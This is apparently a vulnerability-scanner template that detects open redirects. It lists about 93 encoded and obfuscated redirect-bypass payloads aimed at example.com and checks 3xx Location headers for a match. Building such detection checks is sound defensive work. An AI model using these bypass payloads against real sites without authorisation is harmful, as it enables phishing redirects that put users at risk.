id: open-redirect-generic

info:
  name: Open Redirect - Detection
  author: afaq,melbadry9,Elmahdi,pxmme1337,Regala_,andirrahmani1,geeknik
  severity: medium
  description: An open redirect vulnerability was detected. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-601
  metadata:
    max-request: 93
  tags: redirect,generic

http:
  - method: GET
    path:
      - "{{RootURL}}/{{redirect}}"

    payloads:
      redirect:
        - '%0a/example.com/'
        - '%0d/example.com/'
        - '%00/example.com/'
        - '%09/example.com/'
        - '%5C%5Cexample.com/%252e%252e%252f'
        - '%5Cexample.com'
        - '%5cexample.com/%2f%2e%2e'
        - '%5c{{RootURL}}example.com/%2f%2e%2e'
        - '../example.com'
        - '.example.com'
        - '/%5cexample.com'
        - '////\;@example.com'
        - '////example.com'
        - '///example.com'
        - '///example.com/%2f%2e%2e'
        - '///example.com@//'
        - '///{{RootURL}}example.com/%2f%2e%2e'
        - '//;@example.com'
        - '//\/example.com/'
        - '//\@example.com'
        - '//\example.com'
        - '//\texample.com/'
        - '//example.com/%2F..'
        - '//example.com//'
        - '//%69%6e%74%65%72%61%63%74%2e%73%68'
        - '//example.com@//'
        - '//example.com\texample.com/'
        - '//https://example.com//'
        - '/<>//example.com'
        - '/\/\/example.com/'
        - '/\/example.com'
        - '/\example.com'
        - '/example.com'
        - '/example.com/%2F..'
        - '/example.com/'
        - '/example.com/..;/css'
        - '/https:example.com'
        - '/{{RootURL}}example.com/'
        - '/〱example.com'
        - '/〵example.com'
        - '/ゝexample.com'
        - '/ーexample.com'
        - '/ｰexample.com'
        - '<>//example.com'
        - '@example.com'
        - '@https://example.com'
        - '\/\/example.com/'
        - 'example%E3%80%82com'
        - 'example.com'
        - 'example.com/'
        - 'example.com//'
        - 'example.com;@'
        - 'https%3a%2f%2fexample.com%2f'
        - 'https:%0a%0dexample.com'
        - 'https://%0a%0dexample.com'
        - 'https://%09/example.com'
        - 'https://%2f%2f.example.com/'
        - 'https://%3F.example.com/'
        - 'https://%5c%5c.example.com/'
        - 'https://%5cexample.com@'
        - 'https://%23.example.com/'
        - 'https://.example.com'
        - 'https://////example.com'
        - 'https:///example.com'
        - 'https:///example.com/%2e%2e'
        - 'https:///example.com/%2f%2e%2e'
        - 'https:///example.com@example.com/%2e%2e'
        - 'https:///example.com@example.com/%2f%2e%2e'
        - 'https://:80#@example.com/'
        - 'https://:80?@example.com/'
        - 'https://:@\@example.com'
        - 'https://:@example.com\@example.com'
        - 'https://;@example.com'
        - 'https://\texample.com/'
        - 'https://example.com/example.com'
        - 'https://example.com/https://example.com/'
        - 'https://www.\.example.com'
        - 'https:/\/\example.com'
        - 'https:/\example.com'
        - 'https:/example.com'
        - 'https:example.com'
        - '{{RootURL}}example.com'
        - '〱example.com'
        - '〵example.com'
        - 'ゝexample.com'
        - 'ーexample.com'
        - 'ｰexample.com'
        - 'redirect/example.com'
        - 'cgi-bin/redirect.cgi?example.com'
        - 'out?example.com'
        - 'login?to=http://example.com'
        - '1/_https@example.com'
        - 'redirect?targeturl=https://example.com'

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: regex
        part: header
        regex:
          - '(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)(?:[a-zA-Z0-9\-_\.@]*)example\.com\/?(\/|[^.].*)?$' # https://regex101.com/r/ZDYhFh/1

      - type: status
        status:
          - 301
          - 302
          - 307
          - 308
        condition: or
# digest: 4b0a00483046022100f4fe9201a11ea90485c2a26c406a0dbecb9ea8e674bf3ccbcaf01ed4c57421c3022100a9c075d4a231b4acd4adfce87b2f858c65cb9dc3b896d7b07759c4395e0be18f:922c64590222798bb761d5b6d8e72950
